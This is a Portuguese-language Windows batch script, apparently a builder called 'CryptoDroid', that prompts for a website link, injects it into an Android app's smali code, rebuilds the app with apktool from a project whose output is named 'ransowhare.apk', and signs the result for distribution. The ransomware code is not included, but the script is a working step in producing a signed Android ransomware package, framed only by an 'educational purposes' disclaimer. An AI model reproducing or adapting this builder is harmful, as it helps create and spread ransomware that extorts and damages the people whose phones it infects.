@echo off
title SCRIPT CYBER - CryptoDroid
cls
chcp 1252
color 0a
:home
cls
echo                          ########                  #
echo                      #################            #
echo                   ######################         #
echo                  #########################      #
echo                ############################
echo               ##############################
echo               ###############################
echo              ###############################
echo              ##############################             CryptoDroid
echo                              #    ########   #
echo                 ##        ###        ####   ##
echo                                      ###   ###
echo                                   ####   ###           
echo               ####          ##########   ####
echo               #######################   ####
echo                 ####################   ####
echo                  ##################  ####
echo                    ############      ##
echo                       ########        ###
echo                      #########        #####
echo                    ############      ######
echo                   ########      #########
echo                     #####       ########
echo                       ###       #########
echo                      ######    ############
echo                     #######################
echo                     #   #   ###  #   #   ##
echo                     ########################  Author: Bruno V. (Cyber_root)
echo                      ##     ##   ##     ##   02/07/2020
echo.          
echo    AUTHOR LINK:  https://github.com/Cyber-Root0
echo =====================================================================
echo "A UTILIZAÇÃO DO SCRIPT é DE RESPONSABILIDADE TOTAL DO USUÁRIO FINAL."
echo "O Desenvolvedor Não Assume Nenhuma Responsabilidade e Não é Responsavel
echo  Por Qualquer Dano Causado"
echo ======================================================================
echo.
echo  1 - EU ESTOU USANDO O SCRIPT APENAS PARA FINS EDUCACIONAIS
echo.
SET /p frase=SELECIONE A OPÇÃO:
if %frase% equ 1 (goto inicio) else (goto home)
:inicio
cls
echo                          ########                  #
echo                      #################            #
echo                   ######################         #
echo                  #########################      #
echo                ############################
echo               ##############################
echo               ###############################
echo              ###############################
echo              ##############################
echo                              #    ########   #
echo                 ##        ###        ####   ##
echo                                      ###   ###
echo                                   ####   ###           
echo               ####          ##########   ####                  CryptoDroid
echo               #######################   ####
echo                 ####################   ####
echo                  ##################  ####
echo                    ############      ##
echo                       ########        ###
echo                      #########        #####
echo                    ############      ######
echo                   ########      #########
echo                     #####       ########
echo                       ###       #########
echo                      ######    ############
echo                     #######################
echo                     #   #   ###  #   #   ##
echo                     ########################  Author: Bruno V. (Cyber_root)
echo                      ##     ##   ##     ##   02/07/2020
echo.          
echo    AUTHOR LINK:  https://github.com/Cyber-Root0
echo ==================================================================
echo                 ETAPA 1 - CONFIGURANDO ARQUIVOS....
echo.
SET /p site=DIGITE O LINK DO SITE:
echo.
echo.
fart -i app\smali\com\example\kico\myapplication\MainActivity.smali "site" "%site%"
echo.
echo ===================================================================
echo Pressione Enter:
pause > null
cls


title Carregando... 10%%
echo.
echo Carregando Aguarde...  Í^>
ping 127.0.0.1 -n 2 > nul&goto bar1
::1
:bar1
cls
title Carregando... 30%%
echo.
echo Carregando Aguarde...  ===^>
ping 127.0.0.1 -n 2 > nul&goto bar2
::2
:bar2
cls
title Carregando... 50%%
echo.
echo Carregando Aguarde...  =====^>
ping 127.0.0.1 -n 2 > nul&goto bar3
::3
:bar3
cls
title Carregando... 70%%
echo.
echo Carregando Aguarde...  ========^>
ping 127.0.0.1 -n 2 > nul&goto bar4
::4
:bar4
cls
title Carregando... 90%%
echo.
echo Carregando Aguarde...  ============^>
ping 127.0.0.1 -n 2 > nul&goto bar5
::5
:bar5
cls
title Carregando... 100%%
echo.
echo Carregando Aguarde...  ====================^>
ping 127.0.0.1 -n 2 > nul


cls
echo ETAPA 2 - Gerando Arquivo APK....
java -jar apktool.jar b app
cls
echo ETAPA 3 - Assinando o Seu Apk.....
java -jar signapk.jar certificado.pem key.pk8 "app/dist/ransowhare.apk" gerado/apkpronto.apk
echo.
echo ==================================================================
echo.
echo SEU APK FOI CRIADO COM SUCESSO....
echo AGUARDE MAIS ALGUNS INSTANTES ESTAMOS FINALIZANDO TUDO.....
pause
cls
echo ====================================================================
fart -i app\smali\com\example\kico\myapplication\MainActivity.smali "%site%" "site"
cls
echo ===============================================
echo Pronto! Aperte enter para voltar a Pagina Inicial.
pause
goto home

 



















